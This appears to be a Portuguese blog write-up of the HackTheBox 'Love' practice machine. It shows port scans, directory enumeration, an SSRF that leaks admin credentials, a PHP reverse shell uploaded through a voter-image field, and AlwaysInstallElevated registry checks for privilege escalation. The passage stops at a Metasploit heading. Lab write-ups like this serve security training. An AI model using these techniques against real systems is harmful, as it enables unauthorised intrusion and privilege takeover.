            <link>https://brunomcuesta.github.io/posts/2021/08/hackthebox-love/</link>
            <pubDate>Sat, 21 Aug 2021 13:39:28 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/08/hackthebox-love/</guid>
            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Love&amp;rsquo; do HackTheBox. Na parte de escalação de privilégios é demonstrado como obter shell do Administrator de várias formas abusando do &amp;lsquo;AlwaysInstallElevated&amp;rsquo; habilitado no sistema.
Informações da Máquina IP: 10.10.10.239
Sistema Operacional: Windows
Nível de dificuldade: Easy
Varredura e Enumeração Port Scan # Nmap 7.91 scan initiated Thu Jun 24 17:39:25 2021 as: nmap -v -sC -sV -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -Pn -oN details.txt 10.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/npEuHZw.jpg"  alt="Love Cover"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Love&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>. Na parte de escalação de privilégios é demonstrado como obter shell do Administrator de várias formas abusando do &lsquo;AlwaysInstallElevated&rsquo; habilitado no sistema.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.239</p>
<p>Sistema Operacional: Windows</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Thu Jun 24 17:39:25 2021 as: nmap -v -sC -sV -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -Pn -oN details.txt 10.10.10.239</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.239
Host is up <span style="color:#f92672">(</span>0.48s latency<span style="color:#f92672">)</span>.

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: examples
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: <span style="color:#ae81ff">403</span> Forbidden
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
| Issuer: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">2048</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add <span style="color:#ae81ff">5048</span> afc8 b3cf <span style="color:#ae81ff">7140</span> 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 <span style="color:#ae81ff">4036</span> a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Host <span style="color:#e6db74">&#39;10.10.16.52&#39;</span> is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: <span style="color:#ae81ff">403</span> Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-title: Not Found
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName<span style="color:#f92672">=</span>LOVE
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">4096</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a 2ba6 8ef4 <span style="color:#ae81ff">7568</span> f99d d6f4 aaa2 03b5
|_SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
|_ssl-date: 2021-06-24T21:16:39+00:00; +33m52s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/24%Time<span style="color:#f92672">=</span>60D4ED8E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>HT
SF:TPOptions,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x
</span><span style="color:#e6db74">SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPR
SF:equest,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck
SF:,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed
</span><span style="color:#e6db74">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBind
SF:ReqTCP,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatu
SF:sRequestTCP,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not
</span><span style="color:#e6db74">SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Hel
SF:p,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowe
</span><span style="color:#e6db74">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq
SF:,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed
</span><span style="color:#e6db74">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer
SF:Cookie,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessi
SF:onReq,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20al
</span><span style="color:#e6db74">SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,
SF:4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\
</span><span style="color:#e6db74">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,4A,<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">SF:F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20t
</span><span style="color:#e6db74">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,4A,<span style="color:#e6db74">&#34;F\0\0
</span><span style="color:#e6db74">SF:\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20
</span><span style="color:#e6db74">SF:connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,4A,<span style="color:#e6db74">&#34;F\0\0\x0
</span><span style="color:#e6db74">SF:1\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20con
</span><span style="color:#e6db74">SF:nect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xf
</span><span style="color:#e6db74">SF:fj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20connect
</span><span style="color:#e6db74">SF:\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x
</span><span style="color:#e6db74">SF:04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20
</span><span style="color:#e6db74">SF:to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>;
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h18m52s, deviation: 3h30m02s, median: 33m51s
| smb-os-discovery: 
|   OS: Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Pro 6.3<span style="color:#f92672">)</span>
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|_  System time: 2021-06-24T14:16:15-07:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-24T21:16:22
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Thu Jun 24 17:42:50 2021 -- 1 IP address (1 host up) scanned in 204.45 seconds</span>
</code></pre></div><h3 id="enumeração-de-diretórios">Enumeração de diretórios</h3>
<p>Enumerando os diretórios com o gobuster foi possível encontrar uma página de login &lsquo;admin&rsquo; e serviços como &lsquo;tcpdf&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://10.10.10.239 -w /home/bruno/github/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt

/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 340<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/includes/<span style="color:#f92672">]</span>
/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 338<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/images/<span style="color:#f92672">]</span>  
/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 337<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/admin/<span style="color:#f92672">]</span>   
/plugins              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 339<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/plugins/<span style="color:#f92672">]</span> 
/.htm                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/webalizer            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4388<span style="color:#f92672">]</span>                                   
/phpmyadmin           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/examples             <span style="color:#f92672">(</span>Status: 503<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 402<span style="color:#f92672">]</span>
/.htc                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/dist                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 336<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/dist/<span style="color:#f92672">]</span>    
/.html_var_de         <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/licenses             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span>                                    
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span> 
/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/con                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/tcpdf                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 337<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/tcpdf/<span style="color:#f92672">]</span>   
/.html.               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html.html           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htpasswds           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span> 
/.htm.                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htmll               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html.old            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
/.html.bak            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.ht                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htm.htm             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/aux                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html1               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htgroup             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html.lck            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html.printable      <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
/prn                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                        
/.htm.lck             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htaccess.bak        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.html.php            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htmls               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/.htx                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
/server-info          <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span>                                    
/.htlm                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>Acessando a porta 80 encontramos uma página de login, solicitando a ID de votação e senha.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/
</code></pre></div>
    <img src="https://i.imgur.com/OPdc6yW.png"  alt="Love - Página Inicial"  class="center"  style="border-radius: 8px;"  />


<p>Acessando a URL do tcpdf surge uma mensagem de erro.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/tcpdf/tcpdf.php
</code></pre></div>
    <img src="https://i.imgur.com/zKGQ75f.png"  alt="Tcpdf error"  class="center"  style="border-radius: 8px;"  />


<p>Acessando a porta 5000 é informado que não temos permissão para visualizar seu conteúdo.</p>

    <img src="https://i.imgur.com/9X5jnBJ.png"  alt="Forbidden porta 5000"  class="center"  style="border-radius: 8px;"  />


<p>Para acessar a aplicação via domínio, que é mostrado pelo nmap, adicionamos o IP da máquina ao /etc/hosts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.239 love.htb staging.love.htb
</code></pre></div><p>Acessando a página via https.</p>

    <img src="https://i.imgur.com/Cj5cRMT.png"  alt="Alerta certificado https"  class="center"  style="border-radius: 8px;"  />


<p>Visualizando o certificado aparece um potencial nome de usuário do sistema, o &lsquo;<a href="mailto:roy@love.htb">roy@love.htb</a>&rsquo;</p>

    <img src="https://i.imgur.com/oOOBsH7.png"  alt="Visualizando o certificado https"  class="center"  style="border-radius: 8px;"  />


<p>Acessando a página via domínio aparece um menú com uma opção &ldquo;Demo&rdquo;.</p>

    <img src="https://i.imgur.com/ZwwgbvS.png"  alt="Página Inicial - Free File Scanner"  class="center"  style="border-radius: 8px;"  />


<p>A página &ldquo;demo&rdquo; mostra um campo para submeter uma URL e informar o conteúdo da página solicitada.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://staging.love.htb/beta.php
</code></pre></div>
    <img src="https://i.imgur.com/PKSHEOP.png"  alt="Demo - Free File Scanner"  class="center"  style="border-radius: 8px;"  />


<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>Nesta página &lsquo;Demo&rsquo; foram feitos diversos testes usando as URLS e portas mostradas na saída do Nmap:</p>
<ul>
<li>Ao informar 127.0.0.1 mostra a página de login.</li>
<li>Ao informar 127.0.0.1/admin/ mostra a página de login do admin.</li>
<li>Ao informar o 127.0.0.1/server-status mostra o status do servidor.</li>
<li>Ao informar love.htb:47001 é mostrado o erro &ldquo;404 not found&rdquo;.</li>
<li>Ao informar o path C:\xampp\htdocs\omrs\tcpdf\tcpdf.php mostra a mensagem &ldquo;Forbidden You don&rsquo;t have permission to access this resource&rdquo;.</li>
</ul>
<p>Após várias tentativas com portas e URLs a aplicação revela na porta 5000 a credencial do usuário admin.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">127.0.0.1:5000
</code></pre></div>
    <img src="https://i.imgur.com/CVGLwit.png"  alt="Credenciais Admin"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">admin: @LoveIsInTheAir!!!!
</code></pre></div><p>Com as credenciais deste usuário podemos efetuar o login na área do admin.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/admin/index.php
</code></pre></div>
    <img src="https://i.imgur.com/CvkfAj9.png"  alt="Login Admin"  class="center"  style="border-radius: 8px;"  />


<p>Visualizando o &lsquo;dashboard&rsquo; do admin após efetuar o login.</p>

    <img src="https://i.imgur.com/lguY9Hi.png"  alt="Dashboard Admin"  class="center"  style="border-radius: 8px;"  />


<h2 id="exploração">Exploração</h2>
<p>Explorando o dashboard encontramos uma listagem de votantes.</p>

    <img src="https://i.imgur.com/XRQZbJq.png"  alt="Dashboard - Lista de votantes"  class="center"  style="border-radius: 8px;"  />


<p>Nesta página é possível cadastrar um novo votante com a possibilidade de fazer o upload de uma imagem. No campo de imagem deste form foi possível submeter um &lsquo;reverse shell&rsquo; em PHP.</p>

    <img src="https://i.imgur.com/hQ3S4Sv.png"  alt="Dashboard - Cadastro de votante"  class="center"  style="border-radius: 8px;"  />


<p>O arquivo PHP será salvo na pasta images.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/images/myshell.php
</code></pre></div><p>Após submeter o cadastro de votante e chamar o arquivo PHP enviado, recebemos a conexão do host com o usuário &lsquo;phoebe&rsquo;.</p>

    <img src="https://i.imgur.com/H5aB8r3.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />


<p>Visualizando o conteúdo do diretório &lsquo;images&rsquo; com o &lsquo;reverse shell&rsquo; em PHP.</p>

    <img src="https://i.imgur.com/SARgzVI.png"  alt="Pasta Images"  class="center"  style="border-radius: 8px;"  />


<p>Conteúdo do diretório &lsquo;omrs&rsquo; com os arquivos da aplicação Web.</p>

    <img src="https://i.imgur.com/TZdEJWT.png"  alt="Pasta omrs"  class="center"  style="border-radius: 8px;"  />


<p>Em busca de credenciais encontramos o diretório &lsquo;includes&rsquo; com o arquivo conn.php, responsável pela conexão com o banco de dados Mysql.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">C:\xampp\htdocs\omrs\includes\conn.php
</code></pre></div>
    <img src="https://i.imgur.com/7rKOpKa.png"  alt="Credenciais Mysql"  class="center"  style="border-radius: 8px;"  />


<p>Credenciais do usuário &lsquo;phoebe&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">phoebe:HTB#9826^(_
</code></pre></div><p>Obtendo a flag do usuário &lsquo;phoebe&rsquo;.</p>

    <img src="https://i.imgur.com/HfgQBH9.png"  alt="User Flag"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>Executando o <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a> temos como resultado uma opção para escalar privilégios no host através do privilégio &ldquo;Always Install Elevated&rdquo;.</p>

    <img src="https://i.imgur.com/3G2iV6d.png"  alt="WinPEAS"  class="center"  style="border-radius: 8px;"  />


<p>Quando estes dois registros do Windows estão habilitados os usuários com qualquer privilégio podem instalar arquivos .msi como NT AUTHORITY SYSTEM (Administrator).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre></div><p>Como mostrado no site <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">hacktricks</a> o atacante pode gerar payloads manualmente para executar no host.</p>
<p>Existem duas opções para obter a shell do administrador, criando um .msi que crie um usuário com privilégios de Administrador ou um .msi que execute um &lsquo;reverse shell&rsquo; e entregue a shell do administrador.</p>
<p>Além da forma manual também existe a opção automatizada usando o <a href="https://www.exploit-db.com/exploits/23007">Metasploit</a>. Uma vez obtido o &lsquo;reverse shell&rsquo; com o usuário &lsquo;phoebe&rsquo; o módulo correspondente pode ser chamado para escalar privilégios.</p>
<p>Módulo do Metasploit:</p>
